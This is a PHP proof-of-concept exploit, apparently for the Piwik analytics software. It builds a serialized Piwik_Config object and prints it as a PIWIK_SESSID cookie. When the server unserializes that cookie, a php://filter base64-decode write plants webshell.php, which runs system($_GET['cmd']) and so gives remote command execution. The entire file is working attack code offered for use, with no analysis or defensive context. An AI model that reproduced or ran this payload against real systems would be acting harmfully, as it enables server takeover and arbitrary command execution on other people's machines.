<?php


class Zend_Config {
    protected $_data = array(
        "login" => "root",
        "password" => "rootroot",
        "email" => "root@rootroot.com"
    );
}

class Piwik_Config {
    protected $configFileUpdated = true;
    protected $doWriteFileWhenUpdated = true;
    protected $correctCwd = ".";
    protected $pathIniFileUserConfig = "php://filter/write=convert.base64-decode/resource=/var/www/piwik/webshell.php";
    protected $userConfig = array();

    function __construct() { // 'a' (for padding) + base64encode("<?php system($_GET['cmd']); $closingTag")
        $this->userConfig["aPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg=="] = new Zend_Config;
    }
}

$encoded = serialize(new Piwik_Config);
$encoded = base64_encode($encoded);
echo "Use this cookie";
echo "PIWIK_SESSID=".$encoded."\n";

?>

